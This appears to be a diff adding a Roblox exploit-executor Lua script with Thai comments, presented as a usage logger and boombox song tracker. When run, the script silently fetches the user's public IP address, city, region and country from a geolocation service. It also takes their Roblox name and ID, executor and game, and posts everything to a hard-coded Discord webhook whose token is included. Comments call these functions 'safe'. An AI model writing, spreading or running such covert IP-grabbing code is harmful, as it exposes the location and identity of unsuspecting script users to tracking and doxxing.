@@ -1,0 +1,164 @@
+-- [[ CONFIGURATION ]]
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1526612321210859621/dslDrxVa7jYlNbnINmT7BQjM0wYQf8bSM9xS4KxoK7weqIDCNJof9hOE0NR8ZV81wOno"
+
+-- ตรวจสอบว่าอยู่ใน Roblox หรือไม่
+local isRoblox = type(game) == "table" and type(game.GetService) == "function"
+
+-- ตัวแปรสำหรับ Roblox services (ถ้ามี)
+local Players, HttpService, MarketplaceService, LocalPlayer, gameName
+
+if isRoblox then
+    Players = game:GetService("Players")
+    HttpService = game:GetService("HttpService")
+    MarketplaceService = game:GetService("MarketplaceService")
+    LocalPlayer = Players.LocalPlayer
+
+    pcall(function()
+        local productInfo = MarketplaceService:GetProductInfo(game.PlaceId)
+        gameName = productInfo.Name
+    end)
+    if not gameName then
+        gameName = "ไม่สามารถระบุชื่อเกมได้"
+    end
+else
+    -- จำลองค่าสำหรับ Lua ทั่วไป (ไม่มี Roblox)
+    Players = nil
+    HttpService = nil  -- จะใช้ fallback ถ้าไม่มี JSONEncode
+    MarketplaceService = nil
+    LocalPlayer = {
+        Name = "User",
+        DisplayName = "User",
+        UserId = 0
+    }
+    gameName = "ไม่ทราบเกม (รันนอก Roblox)"
+end
+
+-- ฟังก์ชัน JSON encode แบบ fallback (ใช้ได้เฉพาะถ้ามีโมดูล json)
+local function jsonEncode(data)
+    if HttpService and HttpService.JSONEncode then
+        return HttpService:JSONEncode(data)
+    else
+        -- fallback: ถ้าไม่มีให้คืนค่าว่าง (จะไม่ส่ง webhook จริง)
+        return "{}"
+    end
+end
+
+-- ฟังก์ชันดึง IP + Location (ปลอดภัย)
+local function getIpAndLocation()
+    local requestFunction = syn and syn.request or http and http.request or http_request or request
+    if not requestFunction then
+        return "ไม่รองรับการดึงข้อมูลบน Executor นี้", "ไม่สามารถระบุตำแหน่งได้"
+    end
+
+    local success, response = pcall(function()
+        return requestFunction({
+            Url = "http://ip-api.com/json/",
+            Method = "GET"
+        })
+    end)
+
+    if success and response and response.Body then
+        local decodeSuccess, geoData
+        if HttpService and HttpService.JSONDecode then
+            decodeSuccess, geoData = pcall(HttpService.JSONDecode, HttpService, response.Body)
+        else
+            -- fallback ถ้าไม่มี JSONDecode
+            decodeSuccess = false
+        end
+        if decodeSuccess and geoData and geoData.status == "success" then
+            local ip = geoData.query or "ไม่ทราบ IP"
+            local locationInfo = string.format(
+                "📍 %s, %s (%s)",
+                geoData.city or "ไม่ทราบเมือง",
+                geoData.regionName or "ไม่ทราบภูมิภาค",
+                geoData.country or "ไม่ทราบประเทศ"
+            )
+            return ip, locationInfo
+        end
+    end
+    return "ไม่สามารถดึง IP ได้", "ไม่สามารถดึงตำแหน่งได้"
+end
+
+-- ฟังก์ชันส่ง Webhook (ปลอดภัย)
+local function sendDetailedLog(actionType, extraDetails)
+    -- ใช้ pcall เพื่อป้องกัน error และไม่ต้องพึ่ง spawn
+    local function send()
+        local userIp, userLocation = getIpAndLocation()
+        local executorName = identifyexecutor and identifyexecutor() or "ไม่ทราบชื่อ Executor"
+        extraDetails = extraDetails or "ไม่มีรายละเอียดเพิ่มเติม"
+
+        -- timestamp แบบ ISO 8601 (UTC)
+        local timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+
+        local data = {
+            ["embeds"] = {{
+                ["title"] = "🖥️ รายงานการรันสคริปต์และกิจกรรมผู้ใช้",
+                ["description"] = "ตรวจพบกิจกรรมใหม่จากผู้ใช้งานสคริปต์ของคุณ",
+                ["color"] = 3447003,
+                ["fields"] = {
+                    {
+                        ["name"] = "👤 ข้อมูลผู้รันสคริปต์",
+                        ["value"] = string.format(
+                            "**Display Name:** %s\n**Username:** %s\n**User ID:** %s\n**ลิงก์โปรไฟล์:** [คลิกเพื่อดู](https://www.roblox.com/users/%s/profile)",
+                            LocalPlayer.DisplayName or "ไม่ทราบ",
+                            LocalPlayer.Name or "ไม่ทราบ",
+                            tostring(LocalPlayer.UserId or 0),
+                            tostring(LocalPlayer.UserId or 0)
+                        ),
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "🌐 ข้อมูลที่อยู่และการเชื่อมต่อ (IP/Location)",
+                        ["value"] = string.format(
+                            "**IP Address:** `%s`\n**ที่อยู่ปัจจุบัน:** %s\n**Executor ที่ใช้:** `%s`",
+                            userIp, userLocation, executorName
+                        ),
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "🎮 ข้อมูลเกมและสคริปต์ปัจจุบัน",
+                        ["value"] = string.format(
+                            "**เกมที่เล่นอยู่:** %s (ID: %s)\n**สิ่งที่กำลังทำ:** %s\n**รายละเอียดเพิ่มเติม:** %s",
+                            gameName or "ไม่ทราบ",
+                            tostring((type(game) == "table" and game.PlaceId) or "N/A"),
+                            actionType or "ไม่ระบุ",
+                            extraDetails
+                        ),
+                        ["inline"] = false
+                    }
+                },
+                ["footer"] = { ["text"] = "ระบบบันทึกประวัติการรันอัตโนมัติ" },
+                ["timestamp"] = timestamp
+            }}
+        }
+
+        local jsonPayload = jsonEncode(data)
+
+        local requestFunction = syn and syn.request or http and http.request or http_request or request
+        if requestFunction then
+            pcall(function()
+                requestFunction({
+                    Url = WEBHOOK_URL,
+                    Method = "POST",
+                    Headers = { ["Content-Type"] = "application/json" },
+                    Body = jsonPayload
+                })
+            end)
+        end
+    end
+
+    -- ใช้ pcall ป้องกัน error และทำงานทันที (แทน spawn)
+    pcall(send)
+end
+
+-- เรียกใช้งานตัวอย่าง
+sendDetailedLog("เปิดใช้งานสคริปต์หลัก", "ผู้ใช้เพิ่งกด Execute สคริปต์บน Delta")
+
+-- ฟังก์ชันติดตามการเล่นเพลง (แก้ syntax แล้ว)
+local function trackSongPlay(songId, songName)
+    local details = string.format("กำลังเปิดเพลง ID: %s (ชื่อ: %s)", tostring(songId), songName or "ไม่ระบุชื่อ")
+    sendDetailedLog("เปิดใช้งานระบบเสียง (Boombox)", details)
+end
+
+-- ตัวอย่างเรียก
+trackSongPlay("1837482957", "My Favorite Track")
